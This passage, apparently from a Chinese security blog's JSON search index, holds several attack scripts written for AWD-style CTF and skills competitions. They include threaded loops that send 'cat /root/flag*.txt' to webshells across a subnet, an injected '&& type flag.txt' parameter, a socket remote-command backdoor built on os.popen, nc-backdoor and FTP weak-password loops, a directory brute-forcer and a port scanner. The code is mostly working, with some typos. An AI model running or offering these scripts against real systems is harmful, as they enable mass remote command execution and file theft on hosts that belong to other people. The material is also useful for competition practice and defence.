threadingflag = open(\"webshellsave.txt\",\"a\")def run(i): ip=\"192.168.\"+str(i)+\".128\" url=\"http://\"+ip+\"/WebShell.php/\" payload=&#123;'cmd':'cat /root/flag*.txt'&#125; try: r = requests.get(url,payload,timeout=1) flag.write(r.url+\"\\n\"+r.text) print(\"GET FLAG! &gt;&gt;\",r.url,'\\n',r.text) except: print(\"\\nConnect Fail &gt;&gt;\",url)for i in range(101,254): t = threading.Thread(target=run, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:Web_Dirs_Scnnaer","slug":"Python脚本Web_Dirs_Scanner","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:59.293Z","comments":true,"path":"2018/10/10/Python脚本Web_Dirs_Scanner/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本Web_Dirs_Scanner/","excerpt":"","text":"0x00 介绍 看到一些web目录扫描器。自己也尝试写了一下xD 12345678910111213141516171819202122232425262728import requestsimport randomimport reuser_agent_list = [&#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'&#125;,]user_agent = random.choice(user_agent_list)target = input(\"target host &gt;\")dict_path_file = input(\"dicr file &gt;\")def CheckURLProtocol(): Check = re.match(r\"http?://\",target) if Check == None: print(\"[-]Example: http://127.0.0.1 or https://127.0.0.1\") exit(0) else: with open(dict_path_file) as f: for dic in f.readlines(): url = target + str(dic) url = url.replace(\"\\n\",\"\") try: r = requests.get(url,headers=user_agent) if r.status_code == 200: print(r.url) except: pass 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:socket_cmd连接","slug":"Python脚本socket_cmd连接","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:03.941Z","comments":true,"path":"2018/10/10/Python脚本socket_cmd连接/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本socket_cmd连接/","excerpt":"","text":"0x00 介绍 为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD Server: 123456789101112131415161718192021import socket,osdef main(): global data, s s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('127.0.0.1',10001)) s.listen(5) print(\"等待连接中……\") while True: conn,addr = s.accept() while True: print('收到命令') data = conn.recv(1024) cmd = os.popen(data.decode()) os_result = cmd.read() conn.sendall(os_result.encode('utf8'))if __name__ == '__main__': main() Client: 1234567891011121314151617import socketServerIP=('127.0.0.1',10001)try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) s.connect(ServerIP) print('[+]连接成功')except: print('[-]服务器无响应') exit(0)while True: data=input('[CMD]&gt;&gt;') s.sendto(bytes(data,encoding='utf8'),ServerIP) data = s.recv(1024) print('[+]回显成功') print(data.decode()) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:WebShell_urilb","slug":"Python脚本WebShell_urilb","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:52.701Z","comments":true,"path":"2018/10/10/Python脚本WebShell_urilb/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell_urilb/","excerpt":"","text":"0x00 介绍 使用urlilb模块 在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替 1234567891011121314151617import urllib.parseimport urllib.requestimport threadingdef WebShell(i): data = &#123;\"dir\": \"&amp;&amp; type flag.txt\"&#125; url = \"http://192.168.123.\"+str(i)+\"/DirCtrl.php\" data_string=urllib.parse.urlencode(data) new_url=url+\"?\"+data_string try: send = urllib.request.urlopen(new_url,timeout=1) print(send.read().decode(\"utf8\",\"ignore\")) except: passfor i in range(1,255): t = threading.Thread(target=WebShell, args=(i, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:端口扫描","slug":"Python脚本端口扫描(PortScanner)","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:12.479Z","comments":true,"path":"2018/10/10/Python脚本端口扫描(PortScanner)/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本端口扫描(PortScanner)/","excerpt":"","text":"0x00 介绍 在实训室无聊的时候，随手写了一下端口扫描的Python脚本. 12345678910111213141516171819import socketimport threadingfile=open(\"port.txt\",'w+')def portscan(port): host='192.168.174.1' try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) conn=s.connect_ex((host,port)) if conn ==0: print(\"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;\".format(host,post)) file.write(host+\":\"+str(post)+\"\\n\") else: pass excpet: passfor port in range(1,65535): t=threading.Thread(target=portscan, args=(port, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"Shell脚本","slug":"Shell脚本","date":"2018-10-09T00:00:00.000Z","updated":"2019-10-25T08:23:19.479Z","comments":true,"path":"2018/10/09/Shell脚本/","link":"","permalink":"https://hu5k7.github.io/2018/10/09/Shell脚本/","excerpt":"","text":"0x00 介绍 我在全国职业技能大赛比赛时所用的shell脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=\"192.168.2.\"$ipayload=`echo \"cat /root/flag*.txt;exit\" | nc $ip $port`done 123456webshell:or i in `seq 101 254`;doip=\"192.168.2.\"$icurl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txtdone 1234567ftp:username='admin'passwd='123456'for i in `seq 101 254`;doip=\"192.168.2.\"$ish ftpmain.sh $ip $username $passwd 1234567#配合ftp使用ftpmain:ftp $1 -invuser $2 $3get /root/flag*.txtbye! 有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。 尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战 这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛 转载请标明出处","categories":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/categories/Shell/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/tags/Shell/"}]}]}